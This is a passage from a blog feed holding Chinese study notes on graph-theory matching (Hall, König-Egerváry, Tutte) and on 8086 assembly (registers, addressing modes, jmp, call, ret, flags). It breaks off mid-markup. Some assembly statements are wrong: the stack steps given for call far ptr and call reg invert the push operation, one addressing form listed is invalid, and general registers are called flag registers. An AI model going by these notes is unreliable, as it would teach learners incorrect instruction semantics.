      <url>/2021/10/12/graphtheory/graphtheory1/</url>
      
        <content type="html"><![CDATA[<h1 id="匹配理论"><a href="#匹配理论" class="headerlink" title="匹配理论"></a>匹配理论</h1><h2 id="匹配的定义"><a href="#匹配的定义" class="headerlink" title="匹配的定义"></a>匹配的定义</h2><div class="story post-story"><p><strong>定义</strong>：设M是图G的边子集，且M的任意两条边都不相邻，则称M是G的一个<strong>匹配</strong>；M中同一条边的两个端点称为在M中<strong>相配</strong>；M中边的端点称为被M<strong>许配</strong>；若M中所有顶点都被M许配，则称M是G的<strong>完备匹配</strong>；G中边数最多的匹配称为G的<strong>最大匹配</strong>；若M是G的最大匹配，则称M中的边数|M|为G的匹配数，记作$\alpha(G)=|M|$。</p><p><strong>定义</strong>：设M是图G的匹配，$P=v_0e_1v_1e_2…e_kv_k$是G中的一条轨道（圈），若$e_1,e_2,…,e_k$在M与$E(G)-M$中交替出现，则称P是G中关于M的<strong>交错轨道（圈）</strong>。</p><p><strong>定义</strong>：设$P=v_0e_1v_1e_2…e_{2k+1}v_{2k+1}$是G中关于M的交错轨道，若$e_1,e_3,…,e_{2k+1} \notin M$，$e_2,e_4,…,e_{2k} \in M$且$v_0$与$v_{2k+1}$没有与M许配，则称P是G中关于M的可增广轨道。​</p><p><strong>引理</strong>：M是G的最大匹配，当且仅当G中没有关于M的可增广轨道。</p></div><h2 id="二分图中的匹配"><a href="#二分图中的匹配" class="headerlink" title="二分图中的匹配"></a>二分图中的匹配</h2><div class="story post-story"><p>**定理(Hall)**：设G是二分图，其顶点集合划分为$V(G) = X \cup Y,X \cap Y = \varnothing$​，则G中存在将X中顶点都许配的匹配，当且仅当任给$ S \subseteq X$，都有$|N(S)| \geq |S|$，其中N(S)是与S中顶点相邻的顶点构成的集合，简称为S的邻顶集合。​​</p><p><strong>推论</strong>：对正整数k &gt; 0,k次正则二分图G有完全匹配。</p><p><strong>定义</strong>：设G是一个图，C是其顶点集合的子集，即$C \subseteq V(G)$​，若G中任意一条边都有一个端点属于C，则称C是G的一个<strong>覆盖</strong>，若C是G的覆盖，但C的任何真子集都不是G的覆盖，则称C是G的<strong>极小覆盖</strong>；若$C^*$​是G的覆盖，且不存在G的覆盖C，使得|C|&lt;|$C^*$​|，则称$C^*$​是G的<strong>最小覆盖</strong>，且称|$C^*$|是G的<strong>覆盖数</strong>，记作$\beta(G)$​。</p><p><strong>引理</strong>：假设C是图G的覆盖，M是图G的匹配，则|C|$\geq$|M|</p><p><strong>引理</strong>：若图G存在覆盖C和匹配M，使得|C|=|M|，则C是最小覆盖，M是最大匹配。</p><p><strong>定理</strong>(Konig-Egervary)：设G是二分图，则G的匹配数等于其覆盖数，即$\alpha(G)=\beta(G)$</p><p><strong>二分图匹配研究中一个重要的构造</strong>：$V(G) = X \cup Y,X \cap Y = \varnothing$​，M为图G的最大匹配，设$u \in X$​​未被M许配，设Z是通过交替轨道与u相连的顶点集合，令$S=X \cap Z,T=Y \cap Z$</p></div><h2 id="任意图完备匹配"><a href="#任意图完备匹配" class="headerlink" title="任意图完备匹配"></a>任意图完备匹配</h2><div class="story post-story"><p><strong>定义</strong>：设G’是图G的连通片，若$V(G_{‘})$​​​是奇数，则称G’是G的<strong>奇片</strong>，否则称之为G的<strong>偶片</strong>，我们用o(G)表示G中奇片的个数。</p><p><strong>定理</strong>(Tutte)：G有完备匹配，当且仅当任给$S \subseteq V(G)$，都有$o(G-S) \leq |S|$</p><p><strong>证明必要性的过程中建立的奇片到S顶点的映射思路值得借鉴</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> -[ustc,图论] -[数学,图论] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言笔记</title>
      <link href="/2021/10/12/assembly/assembly/"/>
      <url>/2021/10/12/assembly/assembly/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><div class="story post-story"><p>以16位寄存器为例，我们记为AX[15:0]</p><p>AX、BX、CX、DX、均可分为高八位[15:8]（AH，BH，CH，DH）和低八位[7:0]（AL、BL、CL、DL）</p></div><h2 id="字在寄存器中的存储"><a href="#字在寄存器中的存储" class="headerlink" title="字在寄存器中的存储"></a>字在寄存器中的存储</h2><div class="story post-story"><p>字节：记为byte，一个字节由8bit组成，可以存在8位寄存器中。</p><p>字：记为word，一个字由2字节组成，这两个字节记为高位字节和低位字节。</p></div><h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><div class="story post-story"><ol><li>mov ax,18：将18送入ax寄存器</li><li>mov ah,78：将78送入ah</li><li>add ax,8：将ax的值加8</li><li>mox ax,bx：将bx的值送入ax</li><li>add ax,bx：将ax与bx相加放入ax</li></ol><p><strong>注意：在执行加法运算时，视al与ah为独立的寄存器，也就是说如果单独对al进行加法运算时，在最高位产生进位则不会对ah产生影响。</strong></p><p>在进行数据传输或运算时，应注意指令的两个操作对象位数应该统一，否则视为错误指令，示例如下：</p><p><strong>注意：如下指令均为错误指令！！！</strong></p><ol><li>mov ax,bl             ;八位向十六位传输</li><li>mov bh,ax           ;十六位向八位传输</li><li>mov al,20000      ;超过寄存器储存限制</li><li>add al,100H         ;将高于八位的数传入八位寄存器</li></ol></div><h2 id="8086CPU给出物理地址的方法"><a href="#8086CPU给出物理地址的方法" class="headerlink" title="8086CPU给出物理地址的方法"></a>8086CPU给出物理地址的方法</h2><div class="story post-story"><p><img src="C:\Users\Zya1412\Desktop\Assembly\A1.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\Assembly\A1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="A1"></p><p>当8086CPU读写内存时：</p><ol><li>CPU中的相关部件提供两个十六位地址，一个称为段地址，另一个称为偏移地址；</li><li>段地址和偏移地址通过内部总线送入地址加法器；</li><li>地址加法器将两个16位地址合为20位物理地址；</li><li>地址加法器通过内部总线将物理地址送入控制电路；</li><li>输入输出控制电路将物理地址送入地址总线；</li><li>物理地址被地址总线送入存储器</li></ol><p>地址加法器的合成方法：<strong>物理地址=段地址&lt;&lt;4+偏移地址</strong></p><p>偏移地址为16位，16位的寻址能力位64KB，所以一个段的长度最大为64KB。</p></div><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><div class="story post-story"><p>我们介绍关于段地址的一些寄存器，段地址在8086CPU的段寄存器中存放，这四个寄存器为：CS，DS，SS，ES</p><h3 id="CS-amp-IP"><a href="#CS-amp-IP" class="headerlink" title="CS&amp;IP"></a>CS&amp;IP</h3><p>CS和Ip是8086CPU中最关键的两个寄存器：CS是代码段寄存器；IP是指令指针寄存器。指令地址即CS&lt;&lt;4+IP。</p><p>8086CPU的工作过程可简要描述如下：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓存器；</li><li>IP=IP+所读取的指令长度，从而指向下一条指令；</li><li>执行指令。转到步骤(1),重复这个过程。</li></ol><h3 id="修改CS、IP的指令"><a href="#修改CS、IP的指令" class="headerlink" title="修改CS、IP的指令"></a>修改CS、IP的指令</h3><p>mov指令未提供修改CS、IP指令的功能(大概是因为这会引起混乱)</p><p>但我们可以通过“jmp 段地址:偏移地址”修改CS，IP。若想仅修改IP的内容，可用“jmp 某寄存器”的形式完成，如：jmp ax这个指令形式上等价于mov IP,ax</p></div><h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><div class="story post-story"><p>CPU中，用16位寄存器来存储一个字。高8位存放高位字节，低8位存放低位字节。由于内存单元是字节单元，所以一个字需要两个地址连续的内存单元来存放。</p><p>由此我们引出字单元的概念：字单元即存放一个字形数据(16位)的内存单元，由两个地址连续的内存单元组成。</p></div><h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><div class="story post-story"><p>CPU读取一个内存单元时，必须先给出这个内存单元的地址，在8086PC中，内存地址由段地址和偏移地址组成。DS寄存器通常存放要访问数据的段地址。比如要读取/写入10000H单元的内容过程可如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;read</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov al,[0]</span><br><span class="line">;write</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov [0],cx</span><br></pre></td></tr></table></figure><p><strong>注意：8086CPU不支持将立即数传入ds寄存器的操作，故我们需要先将地址装入另一个无关寄存器，再通过这个寄存器放入ds。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;一些基础指令</span><br><span class="line">mov ax,bx ;将bx移入ax</span><br><span class="line">add ax,bx ;将ax与bx求和放入ax</span><br><span class="line">sub ax,bx ;将ax-bx放入ax</span><br><span class="line">;这三个指令支持的类型有三个：寄存器，存储单元，立即数</span><br></pre></td></tr></table></figure></div><h2 id="CPU的栈机制"><a href="#CPU的栈机制" class="headerlink" title="CPU的栈机制"></a>CPU的栈机制</h2><div class="story post-story"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ax;将ax的数据入栈</span><br><span class="line">pop ax;将栈顶的数据弹出并存入ax</span><br><span class="line">;栈的操作支持数据存储类型：存储单元，寄存器</span><br></pre></td></tr></table></figure><p>关于栈，8086CPU存在两个寄存器：段寄存器SS和寄存器SP。</p><p>栈顶段地址存放在SS中，偏移地址存放在SP中。任意时刻SS:SP指向栈顶元素。push/pop指令执行时，CPU从SS和SP中得到栈顶的地址。</p><p>注意到：SS:SP的机制与CS:IP的机制相同，故一个栈段的大小也为64KB。</p><p>[bx]表示一个内存单元，它的偏移地址在bx中</p><p>我们定义(reg)表示寄存器中的数据</p><h1 id="Loop指令"><a href="#Loop指令" class="headerlink" title="Loop指令"></a>Loop指令</h1><p>loop指令的格式：loop标号，CPU执行loop指令时，要进行两部操作：</p><ol><li>(cx)=(cx)-1</li><li>判断cx的值，不为0则转至标号处执行程序，如果为0则向下执行</li></ol><p>eg：计算2^12</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div><h2 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h2><div class="story post-story"><p>在普通的mov ax,[bx]指令中，内存单元的偏移地址由bx给出，而段地址默认在ds中。我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[bx]</span><br><span class="line">mov ax,cs:[bx]</span><br><span class="line">mov ax,ss:[bx]</span><br><span class="line">mov ax,es:[bx]</span><br></pre></td></tr></table></figure><p>以上的ds,cs,es,ss均为<strong>段前缀</strong></p><h1 id="更灵活的定位内存地址的方法"><a href="#更灵活的定位内存地址的方法" class="headerlink" title="更灵活的定位内存地址的方法"></a>更灵活的定位内存地址的方法</h1></div><h2 id="and-amp-or指令"><a href="#and-amp-or指令" class="headerlink" title="and &amp; or指令"></a>and &amp; or指令</h2><div class="story post-story"><p>and指令：做按位与</p><p>or指令：做按位或</p></div><h2 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx + idata]"></a>[bx + idata]</h2><div class="story post-story"><p><strong>寄存器相对寻址</strong></p><p>[bx + idata]表示一个内存单元，它的偏移地址为(bx)+idata(bx中的数值加idata)</p><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[200+bx]</span><br></pre></td></tr></table></figure><p>这个命令是将((ds)*16+(bx)+200)送入ax中</p><p>有了这种记录方式，就可以利用loops循环操作数组(不断改变bx来改变偏移量)</p></div><h2 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h2><div class="story post-story"><p><strong>基址变址寻址</strong></p><p>SI和DI是x86中和bx功能相似的寄存器，它们不能被分为两个8位寄存器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[200+si]</span><br><span class="line">mov ax,[s00+di]</span><br></pre></td></tr></table></figure><p><strong>相对基址变址寻址</strong></p><p>可以用bx，si，di，idata互相组合构成偏移量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+idata]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+di]</span><br><span class="line">mov ax,[bx+si+idata]</span><br><span class="line">mov ax,[bx+di+idata]</span><br><span class="line">mov ax,[bx+si+di+idata]</span><br></pre></td></tr></table></figure><p>可以操作二，三维数组。bp寄存器与si，di作用相同。</p></div><h2 id="指令要处理的数据长度"><a href="#指令要处理的数据长度" class="headerlink" title="指令要处理的数据长度"></a>指令要处理的数据长度</h2><div class="story post-story"><h3 id="通过寄存器名指明要处理的数据尺寸"><a href="#通过寄存器名指明要处理的数据尺寸" class="headerlink" title="通过寄存器名指明要处理的数据尺寸"></a>通过寄存器名指明要处理的数据尺寸</h3><h4 id="字操作"><a href="#字操作" class="headerlink" title="字操作"></a>字操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">mov bx,ds:[0]</span><br><span class="line">inc ax</span><br><span class="line">add ax,1000</span><br></pre></td></tr></table></figure><h4 id="字节操作"><a href="#字节操作" class="headerlink" title="字节操作"></a>字节操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">mov al,bl</span><br><span class="line">mov al,ds:[0]</span><br><span class="line">inc al</span><br><span class="line">add al,100</span><br></pre></td></tr></table></figure><h3 id="用操作符-X-ptr-指明内存单元的长度"><a href="#用操作符-X-ptr-指明内存单元的长度" class="headerlink" title="用操作符 X ptr 指明内存单元的长度"></a>用操作符 X ptr 指明内存单元的长度</h3><p>X可以为word或byte</p><h4 id="word-ptr指明内存单元为字单元"><a href="#word-ptr指明内存单元为字单元" class="headerlink" title="word ptr指明内存单元为字单元"></a>word ptr指明内存单元为字单元</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br><span class="line">add word ptr [bx],2</span><br></pre></td></tr></table></figure><h4 id="byte-ptr指明内存单元为字节单元"><a href="#byte-ptr指明内存单元为字节单元" class="headerlink" title="byte ptr指明内存单元为字节单元"></a>byte ptr指明内存单元为字节单元</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></table></figure></div><h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><div class="story post-story"><p>div为除法指令：</p><ol><li><p>除数：有8位或16位两种，在一个reg或内存单元中。</p></li><li><p>被除数：默认放在ax/dx&amp;ax中，若除数8位，被除数则为16位，默认在ax中存放；若除数为16位，被除数则为32位，在dx和ax中存放，dx放高16位，ax放低16位。</p></li><li><p>结果：如果除数为8位，则al存储除法操作的商，ah放余数；若除数为16位，则ax存储商，dx存储余数。</p></li></ol><p>格式如下：</p><p>div reg</p><p>div 内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div byte ptr ds:[0]</span><br><span class="line">div word ptr es:[0]</span><br><span class="line">div word ptr [bx+si+8]</span><br><span class="line">div byte ptr [bx+si+8]</span><br></pre></td></tr></table></figure></div><h2 id="伪指令dd"><a href="#伪指令dd" class="headerlink" title="伪指令dd"></a>伪指令dd</h2><div class="story post-story"><p>db为字节型数据，dw为字型数据，dd为double型数据(32位)</p></div><h2 id="dup操作符"><a href="#dup操作符" class="headerlink" title="dup操作符"></a>dup操作符</h2><div class="story post-story"><p>dup用来与dw，db，dd等数据定义伪指令配合使用的，用来进行数据的重复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0);等价于db 0,0,0</span><br><span class="line">db 3 dup (0,1,2);等价于db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;);等价于db‘abcABCabcABCabcABC&#x27;</span><br></pre></td></tr></table></figure><h1 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h1><p>可以修改IP，或同时修改CS和IP的指令称为转移指令；概括的说，转移指令就是可以控制CPU执行内存中某处代码的指令。</p><p>x86中转移有以下几类：</p><ol><li>只修改IP时，称为段内转移，比如jmp ax</li><li>同时修改CS和IP时，称为段间转移，比如jmp 1000：0</li></ol><p>由于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移。</p><ol><li>短转移的IP修改范围为-128~127</li><li>近转移的IP修改范围为-32768~32767</li></ol><p>x86的转移指令分为以下几类：</p><ol><li>无条件转移指令</li><li>条件转移指令</li><li>循环指令</li><li>过程</li><li>中断</li></ol></div><h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><div class="story post-story"><p>offset的功能是取得标号的偏移地址，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">  start:mov ax,offset start;相当于mov ax,0</span><br><span class="line">    s:mov ax,offset s;相当于mov ax,3</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div><h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><div class="story post-story"><p>jmp指令要给出两种信息：</p><ol><li>转移的目的地址</li><li>转移的距离(段间转移、段内短转移、段内近转移)</li></ol><h3 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h3><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;示例：jmp short 标号;转到标号处执行指令</span><br><span class="line">start: mov ax,0</span><br><span class="line">   jmp short s</span><br><span class="line">   add ax,1</span><br><span class="line">s: inc ax</span><br></pre></td></tr></table></figure><p>add ax 1这个指令由于jmp被跳过未执行，故ax中的数据为1。</p><p><strong>注意：s标号在机器语言中也是立即数，表示为偏移地址(类似于c语言中的函数指针)</strong></p><p>在jmp指令转换为机器语言后，机器语言只会保留jmp指令的指令号(EB)和跳转地址相对当前地址的偏移量作为标号</p><p>jmp short 标号的功能为：(IP)=(IP)+8位位移</p><p>8位位移=标号处地址-jmp指令后第一个字节的地址</p><p>8位位移的范围是-128~127，用补码表示</p><p>类似于jmp short 标号，我们还有jmp near ptr 标号，其功能为IP=(IP)+16位位移。这个指令实现了段内近转移。</p><h3 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h3><p>上述jmp指令，其对应的机器指令是相对于当前IP的转移位移</p><p>“jmp far ptr 标号“实现的是段间转移，又称为远转移：</p><p>far ptr指明了指令用标号的段地址和偏移地址修改CS和IP</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start:mov ax,0</span><br><span class="line">  mov bx,0</span><br><span class="line">  jmp far ptr s</span><br><span class="line">  db 256 dup (0)</span><br><span class="line">s:add ax,1</span><br><span class="line">  inc ax</span><br></pre></td></tr></table></figure><h3 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h3><p>指令格式：jmp 16位register</p><h3 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h3><ol><li>jmp word ptr 内存单元地址(段内转移)</li><li>jmp dword ptr 内存单元地址(段间转移)</li></ol><p>第一个指令的功能是在指定内存中读一个数据作为IP的偏移地址，并执行jmp指令</p><p>第二个指令的功能是在指定内存中的读取连续存放的两个字，高地址处存目的段地址，低地址存目的偏移地址，</p><p>(CS) = (内存单元地址+2)</p><p>(Ip) = (内存单元地址)</p></div><h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2><div class="story post-story"><p>jcxz指令为有条件转移指令，所有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围：-128~127</p><p>指令格式：jcxz 标号</p><p>当(cx)=0时，(IP)=(IP)+8位位移；当(cx)$\neq$0时，什么都不做(程序向下执行)。</p><p>用c代码来翻译即是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((cx) == <span class="number">0</span>)jmp <span class="keyword">short</span> 标号</span><br></pre></td></tr></table></figure></div><h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><div class="story post-story"><p> loop指令为循环指令，所有循环指令都是<strong>短转移</strong>，对应的机器码包含转移地址，对IP的修改范围都是：-128~127</p><p>指令格式: loop 标号（(cx)=(cx)-1，如果(cx)$\neq$0，则转到标号处执行）</p></div><h2 id="根据位移进行转移的意义"><a href="#根据位移进行转移的意义" class="headerlink" title="根据位移进行转移的意义"></a>根据位移进行转移的意义</h2><div class="story post-story"><p>保存位移地址的原因是：使得程序存储在内存任何位置都可以得到正确执行，否则若用绝对地址存储的话，改变指令位置则会出错。</p></div><h2 id="CALL和RET指令"><a href="#CALL和RET指令" class="headerlink" title="CALL和RET指令"></a>CALL和RET指令</h2><div class="story post-story"><h3 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h3><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；</p><p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p><p>执行ret指令进行如下操作：</p><ol><li>(IP)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li></ol><p>执行retf指令进行如下操作：</p><ol><li>(IP)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li><li>(cs)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li></ol><h3 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h3><p>执行call指令时进行两步操作：</p><ol><li>将当前的IP或CS和IP压入栈中</li><li>转移</li></ol><p><strong>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</strong></p><h4 id="依据位移进行转移的call指令"><a href="#依据位移进行转移的call指令" class="headerlink" title="依据位移进行转移的call指令"></a>依据位移进行转移的call指令</h4><p>call指令的格式：    call 标号(将当前的IP压栈后，转到标号处执行指令)</p><p>执行call指令时，具体操作为：</p><ol><li><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(IP)</p></li><li><p>(IP)=(IP)+16位位移</p></li></ol><p>call 标号指令等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><h4 id="转移的目的地址在指令中的call指令"><a href="#转移的目的地址在指令中的call指令" class="headerlink" title="转移的目的地址在指令中的call指令"></a>转移的目的地址在指令中的call指令</h4><p>前面讲的call指令，其对应的机器指令中并没有转移的目的地址，而是相对于当前IP的转移位移。</p><p>“call far ptr 标号”实现的是段间转移。</p><p>执行此种格式的call指令时，进行如下操作：</p><ol><li><p>(sp)=(sp)-2</p><p>(cs)=((ss)*16+(sp))</p><p>(sp)=(sp)-2</p><p>(ip)=((ss)*16+(sp))</p></li><li><p>(cs)=标号所在段的段地址</p><p>(IP)=标号在段中的偏移地址</p></li></ol><p>call far ptr 标号等价于:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h4 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h4><p>指令格式：call 16bits register</p><p>功能：</p><p>(sp)=(sp)-2</p><p>(IP)=((ss)*16+(sp))</p><p>(IP)=(16位register)</p><p>此种指令等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure><h4 id="转移地址在内存中的call指令"><a href="#转移地址在内存中的call指令" class="headerlink" title="转移地址在内存中的call指令"></a>转移地址在内存中的call指令</h4><p>转移地址在内存中的call指令有两种格式。</p><p>(1) call word ptr 内存单元地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure><p>(2) call dword ptr 内存单元地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><h3 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h3><ol><li>两个相乘的数：两个相乘的数，要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存单元字节单元中；如果是16位，一个默认在ax中，；ing一个放在16位reg或内存单元字节中。</li><li>结果：如果是八位，结果默认放在ax中；如果是16位，高位默认在dx中存放，低位在ax中存放。</li></ol><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><p>CPU内部寄存器中，有一种特殊的寄存器，具有以下三种作用：</p><ol><li>用来存储相关指令的某些执行结果</li><li>用来为CPU执行相关指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ol><p>这种特殊的寄存器在8086CPU中被称为标志寄存器。标志寄存器有16位，其中储存的信息通常被称为程序状态字，之前使用的ax,bx,cx,dx,si,di,bp,sp,IP,cs,ds,es皆是标志寄存器，本章的标志寄存器(以下简称flag)是最后一个。</p><p>flag与其它寄存器不一样，其它寄存器用来放数据，都是整个寄存器具有一个意义，而flag寄存器是按位起作用的，其每一位都有专门的含义:</p><p>flag[11]=OF</p><p>flag[10]=DF</p><p>flag[9]=IF</p><p>flag[8]=TF</p><p>flag[7]=SF</p><p>flag[6]=ZF</p><p>flag[4]=AF</p><p>flag[2]=PF</p><p>flag[0]=CF</p></div><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><div class="story post-story"><p>flag第六位是0标志位，它记录相关指令操作后其结果是否为0：是0则ZF为1；非0则ZF为0</p><p>eg:</p><figure class="highlight 